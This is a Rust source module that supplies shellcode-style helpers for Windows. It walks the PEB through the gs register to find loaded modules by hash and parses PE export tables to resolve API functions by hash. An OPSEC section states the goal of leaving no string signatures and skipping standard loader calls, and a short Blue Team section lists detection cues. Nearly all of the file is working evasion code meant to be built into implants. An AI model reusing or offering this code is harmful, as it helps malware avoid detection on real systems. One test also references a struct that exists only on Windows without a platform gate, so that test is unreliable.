//! Position-Independent Code helpers
//!
//! Provides PEB walking and dynamic API resolution without using
//! standard library functions that would leave string signatures.
//!
//! ## Technique
//! 1. Access TEB via segment register (gs:[0x60] on x64)
//! 2. Get PEB from TEB
//! 3. Walk InMemoryOrderModuleList to find modules by hash
//! 4. Parse PE export table to find functions by hash
//!
//! ## OPSEC
//! - No LoadLibraryA/GetProcAddress calls
//! - No string references in binary
//! - Pure position-independent code
//!
//! ## Detection (Blue Team)
//! - Memory access patterns to PEB structures
//! - PE export table parsing from unusual code
//! - Hash comparison loops in shellcode

use crate::api_hash::djb2_hash_runtime;

/// Get module base address by DJB2 hash of module name
///
/// # Safety
/// This function directly accesses Windows internal structures.
/// Only call on Windows systems.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn get_module_by_hash(module_hash: u32) -> Option<*const u8> {
    // Get PEB from TEB (gs:[0x60] on x64)
    let peb: *const u8;
    core::arch::asm!(
        "mov {}, gs:[0x60]",
        out(reg) peb,
        options(nostack, nomem, preserves_flags)
    );

    if peb.is_null() {
        return None;
    }

    // PEB->Ldr is at offset 0x18
    let ldr = *(peb.add(0x18) as *const *const u8);
    if ldr.is_null() {
        return None;
    }

    // Ldr->InMemoryOrderModuleList is at offset 0x20
    let list_head = ldr.add(0x20) as *const ListEntry;
    let mut current = (*list_head).flink;

    // Walk the module list
    while current != list_head {
        // LDR_DATA_TABLE_ENTRY: BaseDllName is at offset 0x58 from InMemoryOrderLinks
        // But InMemoryOrderLinks is at offset 0x10 in the structure
        // So from current (which points to InMemoryOrderLinks), BaseDllName is at offset 0x48
        let base_dll_name = current.cast::<u8>().add(0x48) as *const UnicodeString;
        let dll_base = *(current.cast::<u8>().add(0x20) as *const *const u8);

        if !(*base_dll_name).buffer.is_null() && (*base_dll_name).length > 0 {
            // Convert wide string to bytes and hash
            let name_len = ((*base_dll_name).length / 2) as usize;
            let name_ptr = (*base_dll_name).buffer;

            // Build ASCII name for hashing (uppercase)
            let mut name_bytes = [0u8; 64];
            let mut i = 0;
            while i < name_len && i < 64 {
                let wchar = *name_ptr.add(i);
                name_bytes[i] = (wchar & 0xFF) as u8;
                i += 1;
            }

            let hash = djb2_hash_runtime(&name_bytes[..name_len]);
            if hash == module_hash {
                return Some(dll_base);
            }
        }

        current = (*current).flink;
    }

    None
}

/// Get function address by hash from module's export table
///
/// # Safety
/// This function parses PE headers from raw memory.
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn get_proc_by_hash(module_base: *const u8, func_hash: u32) -> Option<*const ()> {
    if module_base.is_null() {
        return None;
    }

    // Check DOS header magic "MZ"
    if *(module_base as *const u16) != 0x5A4D {
        return None;
    }

    // Get PE header offset from e_lfanew (offset 0x3C)
    let pe_offset = *(module_base.add(0x3C) as *const u32) as usize;
    let pe_header = module_base.add(pe_offset);

    // Check PE signature "PE\0\0"
    if *(pe_header as *const u32) != 0x00004550 {
        return None;
    }

    // Get export directory RVA (offset 0x88 from PE header for x64)
    let export_dir_rva = *(pe_header.add(0x88) as *const u32) as usize;
    if export_dir_rva == 0 {
        return None;
    }

    let export_dir = module_base.add(export_dir_rva);

    // Parse export directory
    let num_names = *(export_dir.add(0x18) as *const u32) as usize;
    let addr_of_funcs = *(export_dir.add(0x1C) as *const u32) as usize;
    let addr_of_names = *(export_dir.add(0x20) as *const u32) as usize;
    let addr_of_ordinals = *(export_dir.add(0x24) as *const u32) as usize;

    let funcs = module_base.add(addr_of_funcs) as *const u32;
    let names = module_base.add(addr_of_names) as *const u32;
    let ordinals = module_base.add(addr_of_ordinals) as *const u16;

    // Walk export names and hash each
    for i in 0..num_names {
        let name_rva = *names.add(i) as usize;
        let name_ptr = module_base.add(name_rva);

        // Get null-terminated string length
        let mut len = 0usize;
        while *name_ptr.add(len) != 0 && len < 256 {
            len += 1;
        }

        let name_slice = core::slice::from_raw_parts(name_ptr, len);
        let hash = djb2_hash_runtime(name_slice);

        if hash == func_hash {
            let ordinal = *ordinals.add(i) as usize;
            let func_rva = *funcs.add(ordinal) as usize;
            return Some(module_base.add(func_rva) as *const ());
        }
    }

    None
}

/// Combined: get function from module by hashes
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
pub unsafe fn resolve_api(module_hash: u32, func_hash: u32) -> Option<*const ()> {
    let module = get_module_by_hash(module_hash)?;
    get_proc_by_hash(module, func_hash)
}

// Internal structures for PEB traversal (Windows-only)
#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[repr(C)]
struct ListEntry {
    flink: *const ListEntry,
    blink: *const ListEntry,
}

#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    buffer: *const u16,
}

// Non-Windows stubs
#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn get_module_by_hash(_module_hash: u32) -> Option<*const u8> {
    None
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn get_proc_by_hash(_module_base: *const u8, _func_hash: u32) -> Option<*const ()> {
    None
}

#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
pub unsafe fn resolve_api(_module_hash: u32, _func_hash: u32) -> Option<*const ()> {
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_list_entry_size() {
        assert_eq!(core::mem::size_of::<ListEntry>(), 16); // Two pointers on x64
    }

    #[test]
    fn test_unicode_string_size() {
        // 2 + 2 + padding + pointer = 16 bytes on x64
        assert!(core::mem::size_of::<UnicodeString>() >= 8);
    }

    #[test]
    #[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
    fn test_non_windows_returns_none() {
        unsafe {
            assert!(get_module_by_hash(0x12345678).is_none());
            assert!(get_proc_by_hash(core::ptr::null(), 0x12345678).is_none());
            assert!(resolve_api(0x12345678, 0x87654321).is_none());
        }
    }
}
